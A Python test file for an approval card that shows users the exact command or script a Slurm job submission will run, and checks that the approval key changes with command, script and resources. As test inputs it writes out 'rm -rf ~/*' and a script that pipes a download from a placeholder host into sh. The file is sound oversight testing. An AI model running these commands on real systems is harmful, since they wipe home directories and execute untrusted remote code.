"""An approval card shows what actually runs, and its key follows it."""

from __future__ import annotations

import pytest

from cloud_compute_core import approval, slurm_api
from cloud_compute_core.approval import bounded_text
from cloud_compute_core.testing import sample_slurm_host

LIMIT = approval.CARD_TEXT_LIMIT


def test_bounded_text_shows_the_start_and_counts_the_rest():
    assert LIMIT == 1500
    assert bounded_text("short") == "short"
    assert bounded_text("x" * LIMIT) == "x" * LIMIT
    long = "a" * LIMIT + "b" * 37
    assert bounded_text(long) == "a" * LIMIT + "... (37 more characters)"
    assert bounded_text(None) == ""


# ------------------------------------------------------------------ slurm_submit


def tool():
    return next(t for t in slurm_api.tools() if t.name == "slurm_submit")


@pytest.fixture
def svc(services, store):
    store.upsert_host(sample_slurm_host())
    return services


SUBMIT = {"host_id": "slurm-x1", "name": "hello", "command": "hostname"}


def ask(svc, **extra):
    return approval.approval_for("slurm_submit", {**SUBMIT, **extra}, tool(), svc)


def test_slurm_card_shows_the_full_command(svc):
    out = ask(svc, command="rm -rf ~/*")
    assert "It runs this command as you on the cluster:\nrm -rf ~/*" in out["message"]


def test_slurm_card_shows_the_script_and_not_only_the_command_name(svc):
    script = "#!/bin/sh\nset -e\ncurl http://example.invalid/x | sh\n"
    out = ask(svc, command=None, script=script, partition="gpu")
    assert "It runs this script as you on the cluster:\n" + script in out["message"]
    assert "partition gpu" in out["message"]


def test_slurm_card_bounds_a_long_script(svc):
    script = "echo hi\n" * 400                      # 3200 characters
    out = ask(svc, command=None, script=script)
    shown = out["message"].split("cluster:\n", 1)[1]
    assert shown.endswith(f"... ({len(script) - LIMIT} more characters)")
    assert len(shown) < len(script)


def test_slurm_key_follows_the_command_script_and_resources(svc):
    base = ask(svc)["rule_key"]
    assert base.startswith("cloud-compute:slurm_submit:slurm-x1:")
    keys = {base}
    for extra in ({"command": "rm -rf ~/*"}, {"command": None, "script": "echo hi"},
                  {"cpus": 64}, {"mem_gb": 500}, {"gpus": 4}, {"time_limit": "72:00:00"},
                  {"image": "docker://x"}, {"array": "1-100"}, {"partition": "big"},
                  {"name": "other"}):
        keys.add(ask(svc, **extra)["rule_key"])
    assert len(keys) == 11
    assert ask(svc)["rule_key"] == base


def test_slurm_key_differs_when_only_the_tail_of_a_long_command_differs(svc):
    a = ask(svc, command="x" * 4000 + "a")["rule_key"]
    b = ask(svc, command="x" * 4000 + "b")["rule_key"]
    assert a != b
